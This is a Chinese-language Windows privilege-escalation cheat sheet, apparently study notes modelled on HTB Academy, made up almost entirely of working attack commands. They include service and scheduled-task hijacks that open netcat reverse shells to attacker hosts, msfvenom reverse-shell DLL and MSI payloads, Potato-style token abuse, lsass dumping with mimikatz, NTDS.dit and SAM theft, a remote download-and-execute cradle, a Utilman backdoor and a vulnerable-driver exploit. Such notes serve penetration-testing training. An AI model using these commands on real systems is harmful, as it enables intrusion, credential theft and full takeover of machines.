>[!NOTE]
>因為各種資訊很雜，主要是利用HTB academy 的架構去製作的。
# 系統資訊列舉
>[!WARNING]
>透過windows原生指令以及工具做列舉。
## 利用系統指令列舉
- Tasklist
```
schtasks /query /fo LIST /v
```
```cmd
tasklist /svc
```
- 環境變數
```cmd-session
set
```
- 系統資訊
```cmd-session
systeminfo
```
- 更新訊息
```cmd-session
wmic qfe
```
```powershell-session
Get-HotFix | ft -AutoSize
```
- 安裝軟體
```cmd-session
wmic product get name
```
```powershell-session
 Get-WmiObject -Class Win32_Product |  select Name, Version
```
```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```
- Listening Port
```cmd-session
netstat -ano
```
- 利用軟體名子尋找service
``` powershell
Get-CimInstance -ClassName Win32_Service -Filter "Name like 'FJTWSVIC'" | Select-Object Name, PathName, StartName, State
```
- 利用PID找process name 
```
tasklist /fi "pid eq 4444"
```
- Logged-In Users
```cmd-session
query user
```
- User Privileges
```cmd-session
whoami /priv
```
- Current User Group Information
```cmd-session
whoami /groups
```
- 所有使用者
```cmd
net user
```
``` powershell
Get-LocalUser
```
- 所有群組
```cmd
 net localgroup
```
``` powershell
Get-LocalGroup
```
- 群組訊息
```cmd-session
net localgroup administrators
```
``` powershell
Get-LocalGroupMember adminteam
```
- 檢查其他磁區
```
wmic logicaldisk
```
- 檢查其他磁區 
```
wmic logicaldisk get caption,description,providername
```
- 檢查軟體權限 
```
icacls "C:\xampp\apache\bin\httpd.exe"
```
## PowerShell 列舉
- Get-Process 
``` powershell
Get-Process
```
- 顯示群組
``` powershell
Get-LocalUser
```
- 進一步顯示群組資訊
``` powershell
Get-LocalGroupMember adminteam
```
- 搜尋檔案
``` powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
- 搜尋檔案
``` powershell
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
- 搜尋服務及他們的binary file
``` powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
- history
``` powershell
Get-History
```
- 已安裝程式
``` powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
- 已安裝程式
``` powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
## 常用測試工具
### accesschk64.exe 
```
accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```
### icacls
```
icacls C:\tasks\schtask.bat
```
### sc.exe
>[!WARNING]
>是windows內建工具，如果使用powershell，要用`sc.exe`
```
sc query #顯示所有service
```
```
sc qc UsoSvc
```
```
sc config UsoSvc
```
```
sc start UsoSvc
```
```
sc stop UsoSvc
```
```
sc config UsoSvc binpath="nc.exe -nv 10.10.10.10 4444 -e cmd"
```
## 自動化工具
>[!WARNING]
>推薦一些自動化及半自動化列舉工具
### PowerUp
[PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)
- 導入PowerUp
``` cmd
C:\Users\user\Desktop\Tools\PowerUp>powershell -ep bypass
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user\Desktop\Tools\PowerUp> . .\PowerUp.ps1
PS C:\Users\user\Desktop\Tools\PowerUp> Invoke-AllChecks
```
- `Invoke-AllChecks` : 執行所有列舉，AbuseFunction會教你能不能abuse
	- **ServiceName**: This is the name of the service
	- **Path:** This is where the program is located or run from
	- **ModifiableFile:** If we can abuse this service, this is the file that will be modified
	- **StartName:** This is who the service runs as. It is important that this user has higher privileges than our current privileges, otherwise it will be pointless in exploiting it. Generally we would like if it is running with **LocalSystem,** or **Administrator** privileges.
	- **CanRestart**: It is important this is **True**. We must have the ability to restart the service otherwise the changes can’t take place to escalate our privileges. If you have access to restart the machine that’s an option, but we generally want to avoid restarting machines if possible.
	- **AbuseFunction**: If we type in this command as-is, **PowerUp.ps1** will exploit the service automatically and add a user named **john** with a password of **Password123!** to the administrator’s group. (This can be changed of course but this is the default configuration.)

- 執行abuse檢測測 (will add john:password123!)
``` powershell
Install-ServiceAbuse -Name "AbyssWebServer"
```
``` powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -User hacker -Password Password1337
```
- Running a custom command
``` powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -Command "reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
```
- 執行可以修改的程式檢測
``` powershell
Get-ModifiableServiceFile
```
### SharpUp 
[SharpUp](https://github.com/GhostPack/SharpUp)
```
SharpUp.exe audit 
```
### PrivescCheck
[PrivescCheck](https://github.com/itm4n/PrivescCheck)
 ``` powershell
Set-ExecutionPolicy Bypass -Scope process -Force
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```
### Windows Exploit Suggester - Next Generation (WES-NG)
[WES-NG](https://github.com/bitsadmin/wesng)
``` cmd
systeminfo > systeminfo.txt
wes.py systeminfo.txt
```
### LaZagne
[LaZagne](https://github.com/AlessandroZ/LaZagne)
```
laZagne.exe all
```
### SessionGopher
[SessionGopher](https://github.com/Arvanaghi/SessionGopher)
```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```
### WinPEAS
[WinPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20240121-3ce7876d)
``` powershell
powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
```
- 當沒有顏色，可以用以下指令
``` 
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```
### 其他列舉工具
- [Watson](https://github.com/rasta-mouse/Watson)
- [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
# 搜尋技巧及機敏資料位置
>[!WARNING]
>用於找密碼、機敏檔案等東西
## 密碼搜尋
```
findstr /si password *.txt 
findstr /si password *.xml 
findstr /si password *.ini
```
```
findstr /spin "password" *.* 
```
```
reg query HKLM /f password /t REG_SZ /s
```
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
```powershell
 select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```
```cmd
findstr /si password *.xml *.ini *.txt *.config
```
```cmd
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```
```cmd
where /R C:\ *.config
```
## Config Files 
```
dir /s *pass* == *cred* == *vnc* == *.config*
```
```
type C:\xampp\mysql\bin\my.ini
```
## Windows sysprep 殘留密碼
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
## PowerShell History
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
```
C:\Users\Administrator\Application Data\Microsoft\Windows\PowerShell\PSReadLine
```
- Powershell  History  Location 
```powershell
(Get-PSReadLineOption).HistorySavePath
```
## 儲存在Windows內部的密碼
```
cmdkey /list
```
- 利用runas執行
```
runas /savecred /user:admin cmd.exe
runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"
```
## IIS Configuration
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.confi
```
# 利用User Privileges提權
>[!WARNING]
>這邊都是力用whoami/priv的提權方式
## SeImpersonatePrivilege與SeAssignPrimaryToken
- JuicyPotato 
 ```cmd
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
- PrintSpoofer
```cmd
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
``` cmd
PrintSpoofer.exe -i -c cmd
```
- RoguePotato
``` cmd
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
```
## 找到SeRestorePrivilege
- 修改Utilman.exe 跟 cmd.exe
```
move C:\Windows\system32\Utilman.exe C:\Windows\system32\Utilman.old
move C:\Windows\system32\cmd.exe C:\Windows\system32\Utilman.exe
```
- 用3389連進去，但是不用帳號密碼
```
rdesktop 192.168.226.172
```
```
Win+U
```
## SeDebugPrivilege
>[!WARNING]
>可以不用管有沒有enable，直接打就可以了
### 利用procdump.exe
- 利用procdump.exe抓取lsass
```cmd-session
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
- 利用mimikatz解析
```cmd-session
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
### psgetsys
>要先用tasklist檢查有哪些可以用的system pid 
```
[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```
``` powershell
psgetsys.ps1; [MyProcess]::CreateProcessFromParent(612,"c:\windows\system32\cmd.exe ","")
```
## SeTakeOwnershipPrivilege
>[!WARNING]
>要先enable，不然可能用不了，另外可能只能做sensitive file read，不能打RCE。
### Enable的方法
- [POC](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) 
```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```
## Read Sensitive File
### 我們有興趣的資料有哪些?
```cmd
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```
### 利用手法
- 檢查檔案權限
```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```
- 檢查檔案擁有人
```powershell
 cmd /c dir /q 'C:\Department Shares\Private\IT'
```
- 檢查ACL
```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
- 奪取owner
```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```
-  修改ACL
```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
# 利用Windows Group提權
>[!WARNING]
>解釋如何透過windows build-in group 做提權。
- 可能可以利用的群組
	- [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)
	- [Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders)
	- [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)
	- [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators)
	- [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)
	- [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators)

## Backup Operators
>[!WARNING]
>如果有在Backup Operators 群組裡面。我們就有機會可以透過開啟SeBackupPrivilege來複製出機敏資料。
### 匯入dll
- [POC](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
### 開啟SeBackupPrivilege
```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
### 竊取 NTDS.dit
```powershell-session
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
- 要抓取其他材料呦
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
- 透過secretsdump解析
```shell
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
### 使用DiskShadow
>[!WARNING]
>原理是把C槽backup出來，然後把裡面的ntds.dit抓出來
- shadowscript.txt
```
set context persistent nowriters#
add volume c: alias binsec#
create#
expose %binsec% z:#
```
- 建立`C:\.enum`
- 修改使用者權限，利用 ACL-object讓svc_backup用有對`C:\Windows\NTDS\ntds.dit`的存取權
``` powershell
*Evil-WinRM* PS C:\.enum> $NTDS = "C:\Windows\NTDS\ntds.dit"
*Evil-WinRM* PS C:\.enum> $acl = Get-Acl $NTDS
*Evil-WinRM* PS C:\.enum> $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("blackfield.local\svc_backup","FullControl","Allow")
*Evil-WinRM* PS C:\.enum> $acl.SetAccessRule($AccessRule)
*Evil-WinRM* PS C:\.enum> $acl | Set-Acl $NTDS
```
- 檢查ACL 
``` powershell
*Evil-WinRM* PS C:\.enum> Get-acl $NTDS | select -expand accesstostring
BLACKFIELD\svc_backup Allow  FullControl
NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
```
- 執行shadowscript.txt
``` powershell
*Evil-WinRM* PS C:\.enum> diskshadow.exe /s C:\.enum\shadowscript.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  6/20/2020 6:42:48 PM

-> set context persistent nowriters
-> add volume c: alias binsec
-> create
Alias binsec for shadow ID {0068d66f-2552-4900-ae8b-8d4f2012c0a9} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {7c516490-e0d1-428d-a35a-ba583b2dcb2d} set as environment variable.

Querying all shadow copies with the shadow copy set ID {7c516490-e0d1-428d-a35a-ba583b2dcb2d}

        * Shadow copy ID = {0068d66f-2552-4900-ae8b-8d4f2012c0a9}               %binsec%
                - Shadow copy set: {7c516490-e0d1-428d-a35a-ba583b2dcb2d}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 6/20/2020 6:42:49 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %binsec% z:
-> %binsec% = {0068d66f-2552-4900-ae8b-8d4f2012c0a9}
The shadow copy was successfully exposed as z:\.
->
*Evil-WinRM* PS C:\.enum>
```
- 撈出`ntds.dit`
```
*Evil-WinRM* PS C:\.enum> cd Z:\
*Evil-WinRM* PS Z:\> cd Windows\NTDS
*Evil-WinRM* PS Z:\Windows\NTDS> cp ntds.dit C:\.enum
```
## Event Log Readers
>[!WARNING]
>因為可以看logs，所以可能可以抓取一些log裡面的帳號密碼。
- 檢查Event Log Readers群組裡面的人
```cmd
net localgroup "Event Log Readers"
```
### 抓取log裡面的user資訊
```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
### Searching Security Logs Using Get-WinEvent
```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## DnsAdmins
>[!WARNING]
>DnsAdmins 成員可以使用dnscmd來管理DNS，然後dnscmd的registry裡面的`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`可以加入客製化dll。
### 製作DLL
```shell
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```
``` shell
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=9001 -f dll > ff.dll
```
### 加入客製化dll
```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```
```
dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.10\share\ff.dll
```
### 找到user sid
```cmd
wmic useraccount where name="netadm" get sid
```
### 確認DNS Service權限
```cmd
sc.exe sdshow DNS
D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```
### 重啟DNS Server
```cmd
sc stop dns
sc start dns
```
## Print Operators
>[!WARNING]
>Print Operator 可以調用`SeLoadDriverPrivilege`的權利
### 開啟`SeLoadDriverPrivilege`的方法
- [POC](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)
- POC上面要替換成這些
```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```
- 透過cl.exe編譯
```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
- 加入
[Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```
- 執行EnableSeLoadDriverPrivilege.exe
```cmd
 EnableSeLoadDriverPrivilege.exe
```
- 提權
[POC](https://github.com/tandasat/ExploitCapcom)
```powershell
.\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```
- No GUI需求
修改LaunchShell裡面的資料，替換下面這行(revshell.exe自行處理)
```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
## Server Operators
>[!WARNING]
>這是一很強大的群組，可以直接做很多操作。
### 檢查服務Permissions
> 服務顯示Server Operators有all的權限。
```cmd
c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
```
### 修改binpath
```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```
### 重新起動服務
```cmd
sc start AppReadiness
```
# Attacking the OS
>[!WARNING]
>針對系統弱點或是設定錯誤提權
> - User Account Control 
>- Weak permission 
>- Kernel Exploit 
>- Vulnerable  Services 
>- DLL Injection
## User Account Control
>[!WARNING]
>Bypass UAC的方法
### 檢查UAC
- 檢查有沒有開
```cmd
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
- 檢查UAC有沒有開
```cmd-session
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
### 檢查Windows Version 
```powershell-session
PS C:\htb> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### 上網查啦
[UACME](https://github.com/hfiref0x/UACME)
## Permissive File System ACLs
>[!WARNING]
>可以竄改Service binary的檔案。

[SharpUp](https://github.com/GhostPack/SharpUp/)
### 尋找可以竄改的Service Binaries
> 利用SharpUp可以很快找到，並在Modifiable Service Binaries裡面找到可以竄改的Servive。
```powershell
PS C:\htb> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
```
### 利用icacls檢查

>Everyone:(I)(F)就是good
```powershell
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
| Mask | Permissions             |     |
| ---- | ----------------------- | --- |
| F    | Full access             |     |
| M    | Modify access           |     |
| RX   | Read and execute access |     |
| R    | Read-only access        |     |
| W    | Read-only access        |     |
### 竄改Service Binary
```cmd
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
```cmd
sc start SecurityService
```
- 如果沒辦法重新啟動service，可以利用`whoami /priv`檢查有沒有`SeShutdownPrivilege`，有的話可以重新開機`shutdown /r /t 0`
## Weak Service Permissions
>[!WARNING]
>透過竄改binpath來執行command
### 尋找可以竄改的Service 
```cmd
C:\htb> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```
### 利用AccessChk檢查
>看到UTHORITY\Authenticated Users有SERVICE_ALL_ACCESS就是大拇指
```cmd
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```
### 修改binpath內容
```cmd
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```
### 重啟服務
```cmd
sc stop WindscribeService
sc start WindscribeService
```
## Unquoted Service Path
>[!WARNING]
>中間有小空格的程式
- 例如
```shell
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```
### 搜尋指令
``` powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

製造出 `C:\Program Files (x86)\System.exe`就有機會提權
## Vulnerable Services
>[!WARNING]
>常見的考法，咧舉出來後，利用服務名稱去google。
### 列舉手法
- 所有安裝的程式
```cmd
wmic product get name
```
- 列舉Listen Port
```cmd
netstat -ano | findstr 6064
```
- 檢查porcess id
```powershell
get-process -Id 3324
```
- 檢查 Running Service
```powershell
get-service | ? {$_.DisplayName -like 'Druva*'}
```
# 其他提權技術
>[!WARNING]
>一些不知道要分類在哪裡的東西，暫時存放在這裡 
## Always Install Elevated
>[!WARNING]
>讓用戶可以自行安裝軟體
### 列舉方式
```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```
```powershell
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```
### 產生MSI安裝檔案
```shell
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```
### 執行安裝檔案
```cmd
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```
## Cron Jobs 
>[!WARNING]
>跟linux類似，就是利用替換排程執行檔的方式提權。
### 列舉
- 查詢排成清單
```cmd
schtasks /query /fo LIST /v
```
```
schtasks /query /tn vulntask /fo list /v
Folder: \ 
HostName: THM-PC1 
TaskName: \vulntask 
Task To Run: C:\tasks\schtask.bat 
Run As User: taskusr1
```
```powershell
Get-ScheduledTask | select TaskName,State
```
- 檢查資料夾編輯權限
```cmd
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```
```
C:\> icacls c:\tasks\schtask.bat 
c:\tasks\schtask.bat  NT AUTHORITY\SYSTEM:(I)(F) 
					  BUILTIN\Administrators:(I)(F) 
					  BUILTIN\Users:(I)(F)
```
- 修改schtask.bat
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
## Runas
>[!WARNING]
>當打到低權限帳號，取得密碼但是無法從外面進去可以用這個

- 有RDP可以用內建指令執行
```
runas /user:backupadmin cmd
```
- 沒有RDP可以用RunasCs
[Github](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1?source=post_page-----b95d3146cfe9--------------------------------)
``` powershell
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
```
## Powershell Remoting
>[!WARNING]
>如果搜尋到powershell的帳號密碼，可以使用powershell Remoting做橫向移動或提權
```
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```